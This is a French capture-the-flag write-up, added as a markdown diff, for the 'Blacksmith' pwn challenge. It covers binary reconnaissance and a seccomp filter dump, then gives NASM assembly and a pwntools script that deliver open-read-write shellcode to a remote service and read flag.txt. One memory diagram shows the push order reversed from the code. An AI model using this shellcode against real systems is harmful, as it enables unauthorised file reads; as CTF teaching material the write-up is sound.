@@ -1,0 +1,355 @@
+---
+title: Blacksmith
+description: WU Blacksmith - Pwn
+categories: [Writeup]
+tags: [writeup, pwn]
+template: doc
+sidebar:
+  order: 3
+  badge:
+    text: 'easy'
+    variant: success
+---
+
+## Résumé
+
+| Info | Valeur |
+|------|--------|
+| **Vulnérabilité** | Exécution de shellcode arbitraire avec restrictions seccomp |
+| **Technique** | Shellcode open-read-write pour lire flag.txt |
+| **Outils** | file, checksec, seccomp-tools, pwntools, nasm |
+
+---
+
+## Reconnaissance initiale
+
+### Identification du binaire
+
+```bash
+$ file blacksmith
+blacksmith: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV),
+dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
+for GNU/Linux 3.2.0, BuildID[sha1]=..., not stripped
+```
+
+### Protections du binaire
+
+```shell wrap
+$ checksec --file=blacksmith
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments
+```
+
+**Points importants :**
+- `NX disabled` : La pile est exécutable
+- `Has RWX segments` : Il y a des segments en lecture-écriture-exécution
+- Cela signifie que du shellcode peut être exécuté directement
+
+### Exécution du programme
+
+```shell wrap
+$ ./blacksmith
+
+                            ___
+                          /   ||
+                         /    ||
+                        /     ||
+                       /      ||
+                      /       ||
+                ___  /        ||
+               |   |/   ___  ||
+               | O |   /   | ||
+               |___|  / /| | ||
+                  |  / / | | ||
+                  | / /  | | ||
+               __ |/ /   | | ||
+              /  \  /    | | || ____
+             / /| \/     | | ||/   /\
+            / / |  \     | | |/   /  \
+           / /  |   \    | |    /    \
+          / /   |    \   | |   /      \
+         / /    |     \  | |  /   /\   \
+        / /     |______\ |_| /   /__\   \
+       / /                   /           \
+      /_/____________________/      ______\
+
+     Do you want to create a mass of weapons? (y/n)>
+```
+
+Le programme demande une confirmation, puis attend une entrée utilisateur qui sera exécutée comme shellcode.
+
+---
+
+## Analyse statique
+
+### Fonction principale
+
+L'analyse dans Ghidra/Cutter révèle que le programme :
+
+1. Demande une confirmation (y/n)
+2. Alloue une zone mémoire avec `mmap()` en RWX (lecture-écriture-exécution)
+3. Lit l'entrée utilisateur dans cette zone
+4. **Applique un filtre seccomp** avant l'exécution
+5. Saute vers le shellcode et l'exécute
+
+### Restrictions seccomp
+
+```shell wrap
+$ seccomp-tools dump ./blacksmith
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
+ 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
+ 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
+ 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
+ 0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010
+ 0008: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0010
+ 0009: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0011
+ 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0011: 0x06 0x00 0x00 0x00000000  return KILL
+```
+
+**Syscalls autorisés :**
+
+| Syscall | Numéro | Description |
+|---------|--------|-------------|
+| `read` | 0 | Lire depuis un file descriptor |
+| `write` | 1 | Écrire vers un file descriptor |
+| `open` | 2 | Ouvrir un fichier |
+| `exit` | 60 | Terminer le processus |
+| `exit_group` | 231 | Terminer tous les threads |
+
+**Syscall interdit notable :** `execve` (59) - impossible de lancer `/bin/sh`
+
+---
+
+## Rappels sur l'assembleur x86-64
+
+### Registres principaux
+
+| Registre | Utilisation pour les syscalls |
+|----------|------------------------------|
+| `rax` | Numéro du syscall |
+| `rdi` | 1er argument |
+| `rsi` | 2e argument |
+| `rdx` | 3e argument |
+| `r10` | 4e argument |
+| `r8`  | 5e argument |
+| `r9`  | 6e argument |
+
+### Convention d'appel syscall Linux x86-64
+
+Pour effectuer un syscall :
+1. Placer le numéro du syscall dans `rax`
+2. Placer les arguments dans `rdi`, `rsi`, `rdx`, `r10`, `r8`, `r9`
+3. Exécuter l'instruction `syscall`
+4. Le résultat est retourné dans `rax`
+
+### Syscalls nécessaires
+
+```
+open("flag.txt", O_RDONLY)
+  rax = 2, rdi = pointeur vers "flag.txt", rsi = 0 (O_RDONLY)
+
+read(fd, buffer, count)
+  rax = 0, rdi = fd retourné par open, rsi = pointeur buffer, rdx = taille
+
+write(1, buffer, count)
+  rax = 1, rdi = 1 (stdout), rsi = pointeur buffer, rdx = taille
+```
+
+---
+
+## Construction du shellcode
+
+### Stratégie : Open-Read-Write
+
+Puisque `execve` est bloqué, on ne peut pas obtenir un shell. Mais on peut :
+1. **open** : Ouvrir le fichier `flag.txt`
+2. **read** : Lire son contenu en mémoire
+3. **write** : Écrire le contenu sur stdout
+
+### Shellcode en assembleur NASM
+
+```asm
+; Shellcode open-read-write pour lire flag.txt
+; Architecture : x86-64 Linux
+
+section .text
+global _start
+
+_start:
+    ; === ÉTAPE 1 : open("flag.txt", O_RDONLY) ===
+    ; Construire la chaîne "flag.txt" sur la pile
+    xor rax, rax            ; RAX = 0
+    push rax                ; Null terminator sur la pile
+
+    ; "flag.txt" en hexadécimal (little-endian) :
+    ; "flag.txt" = 0x7478742e67616c66
+    mov rax, 0x7478742e67616c66
+    push rax                ; Push "flag.txt\0" sur la pile
+
+    mov rdi, rsp            ; RDI = pointeur vers "flag.txt"
+    xor rsi, rsi            ; RSI = 0 (O_RDONLY)
+    xor rdx, rdx            ; RDX = 0 (mode, ignoré pour O_RDONLY)
+    mov rax, 2              ; syscall open = 2
+    syscall                 ; Appel système open()
+    ; RAX contient maintenant le file descriptor (fd)
+
+    ; === ÉTAPE 2 : read(fd, buffer, 100) ===
+    mov rdi, rax            ; RDI = fd retourné par open
+    sub rsp, 100            ; Réserver 100 octets sur la pile pour le buffer
+    mov rsi, rsp            ; RSI = pointeur vers le buffer
+    mov rdx, 100            ; RDX = nombre d'octets à lire
+    xor rax, rax            ; syscall read = 0
+    syscall                 ; Appel système read()
+    ; RAX contient le nombre d'octets lus
+
+    ; === ÉTAPE 3 : write(1, buffer, bytes_read) ===
+    mov rdx, rax            ; RDX = nombre d'octets lus (retour de read)
+    mov rdi, 1              ; RDI = 1 (stdout)
+    mov rsi, rsp            ; RSI = pointeur vers le buffer
+    mov rax, 1              ; syscall write = 1
+    syscall                 ; Appel système write()
+
+    ; === ÉTAPE 4 : exit(0) ===
+    xor rdi, rdi            ; RDI = 0 (code de retour)
+    mov rax, 60             ; syscall exit = 60
+    syscall
+```
+
+### Comment la chaîne est construite sur la pile
+
+```
+Mémoire (pile, de haut en bas) :
+
+RSP → | f | l | a | g | . | t | x | t | \0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 |
+       └─────────────────────────────────────────────────────────────────────┘
+       push 0x7478742e67616c66 puis push 0x0
+
+En little-endian :
+0x66 = 'f', 0x6c = 'l', 0x61 = 'a', 0x67 = 'g'
+0x2e = '.', 0x74 = 't', 0x78 = 'x', 0x74 = 't'
+```
+
+---
+
+## Exploitation avec pwntools
+
+### Script d'exploitation
+
+```python
+#!/usr/bin/env python3
+"""
+Exploit pour le challenge Blacksmith (HTB)
+Envoie un shellcode open-read-write pour lire flag.txt
+en contournant les restrictions seccomp.
+"""
+from pwn import *
+
+context.arch = 'amd64'
+context.os = 'linux'
+
+# Shellcode open-read-write
+shellcode = asm('''
+    /* open("flag.txt", O_RDONLY) */
+    xor rax, rax
+    push rax
+    mov rax, 0x7478742e67616c66
+    push rax
+    mov rdi, rsp
+    xor rsi, rsi
+    xor rdx, rdx
+    mov rax, 2
+    syscall
+
+    /* read(fd, rsp-100, 100) */
+    mov rdi, rax
+    sub rsp, 100
+    mov rsi, rsp
+    mov rdx, 100
+    xor rax, rax
+    syscall
+
+    /* write(1, buffer, bytes_read) */
+    mov rdx, rax
+    mov rdi, 1
+    mov rsi, rsp
+    mov rax, 1
+    syscall
+
+    /* exit(0) */
+    xor rdi, rdi
+    mov rax, 60
+    syscall
+''')
+
+# Connexion locale ou distante
+# p = process('./blacksmith')
+p = remote('REMOTE_IP', REMOTE_PORT)
+
+# Répondre 'y' à la question
+p.sendlineafter(b'(y/n)>', b'y')
+
+# Envoyer le shellcode
+p.sendlineafter(b'>', shellcode)
+
+# Récupérer le flag
+print(p.recvall().decode())
+```
+
+### Exécution
+
+```shell
+$ python3 exploit.py
+[+] Opening connection to REMOTE_IP on port REMOTE_PORT: Done
+[+] Receiving all data: Done
+HTB{XXXXXXXXXXXXXXXXXXXXXXX}
+```
+
+---
+
+## Concepts appris
+
+### seccomp (Secure Computing Mode)
+
+seccomp est un mécanisme du noyau Linux qui filtre les appels système. Il permet de restreindre les syscalls qu'un processus peut effectuer.
+
+| Mode | Description |
+|------|-------------|
+| Mode strict | Seuls `read`, `write`, `exit`, `sigreturn` sont autorisés |
+| Mode filtre | Règles BPF personnalisées pour chaque syscall |
+
+### Technique Open-Read-Write
+
+Quand `execve` est bloqué par seccomp, on ne peut pas lancer un shell. La technique alternative consiste à :
+
+```
+1. open()  → Ouvrir le fichier cible
+2. read()  → Lire son contenu dans un buffer
+3. write() → Afficher le contenu sur stdout
+```
+
+### Construction de chaînes sur la pile
+
+Pour éviter les octets nuls dans le shellcode, on construit les chaînes directement sur la pile en utilisant `push` avec des valeurs immédiates.
+
+---
+
+## Méthodologie
+
+```
+1. file / checksec  → Identifier le binaire et ses protections
+2. Exécuter         → Observer le comportement (demande shellcode)
+3. seccomp-tools    → Identifier les syscalls autorisés
+4. Constater        → execve bloqué, mais open/read/write autorisés
+5. Écrire           → Shellcode open-read-write en assembleur
+6. pwntools         → Envoyer le shellcode et récupérer le flag
+```
